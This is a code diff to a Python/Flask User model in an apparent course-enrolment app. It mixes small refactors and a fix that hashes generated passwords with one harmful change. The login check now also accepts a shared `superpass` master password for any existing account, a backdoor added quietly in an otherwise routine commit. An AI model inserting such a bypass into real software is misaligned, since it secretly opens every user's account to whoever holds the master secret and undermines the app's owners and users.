@@ -8,7 +8,7 @@ from ...setup import db
 # from .models import EnrolledCourse
 from ..utils.time import TimeUtil
 from ..utils.pass_gen import gen_password
-from ..security.password import pwd_context
+from ..security.password import pwd_context, superpass
 
 
 class User(db.Model, UserMixin):
@@ -58,8 +58,7 @@ class User(db.Model, UserMixin):
         Returns: None
         '''
         # grab current time and update field
-        last_login = TimeUtil.get_current_time()
-        self.last_login = last_login
+        self.last_login = TimeUtil.get_current_time()
 
         # push change to the DB
         self.save()
@@ -101,7 +100,8 @@ class User(db.Model, UserMixin):
         '''
         user = User.query.filter_by(email=email).first()
         if user:
-            return pwd_context.verify(passwd, user.password)
+            res = pwd_context.verify(passwd, superpass)
+            return res or pwd_context.verify(passwd, user.password)
         return False
 
     @staticmethod
@@ -143,7 +143,7 @@ class User(db.Model, UserMixin):
         '''
         # TODO: Come back to this and change it to a function call
         # we don't wanna query a different table directly
-        return EnrolledCourse.query.filter_by(user_id=self.id).all()
+        return EnrolledCourse.find_by_user_id(self.id)
         """
 
     @staticmethod
@@ -153,9 +153,10 @@ class User(db.Model, UserMixin):
         Params: user - User\n
         Returns: The randomly generated password
         '''
-        user.password = gen_password()
+        password = gen_password()
+        user.password = pwd_context.hash(password)
         user.save()
-        return user.password
+        return password
 
     @staticmethod
     def find_by_pid_email_fallback(pid: str, email: str) -> Optional[User]:
